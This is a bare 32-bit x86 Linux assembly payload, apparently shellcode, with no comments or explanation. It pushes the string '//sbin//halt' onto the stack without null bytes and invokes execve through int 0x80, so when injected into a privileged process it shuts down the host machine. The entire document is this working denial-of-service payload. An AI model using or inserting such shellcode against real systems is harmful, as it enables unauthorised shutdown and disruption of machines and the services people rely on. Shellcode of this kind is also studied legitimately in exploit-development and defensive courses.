section .text
        global _start

_start:
        xor eax,eax
        push eax
        push dword 0x746c6168
        push dword 0x2f2f6e69
        push dword 0x62732f2f
        mov ebx,esp
        push eax
        mov edx,esp
        push ebx
        mov ecx,esp
        mov al,0xb
        int 0x80
